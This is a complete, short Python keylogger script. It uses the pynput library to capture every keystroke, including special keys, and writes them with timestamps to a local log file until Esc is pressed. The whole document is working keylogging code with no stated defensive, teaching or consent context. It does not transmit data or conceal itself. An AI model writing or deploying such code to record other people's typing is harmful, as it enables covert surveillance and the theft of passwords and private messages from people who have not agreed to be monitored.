from pynput import keyboard
import logging
from datetime import datetime

# Log file setup
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
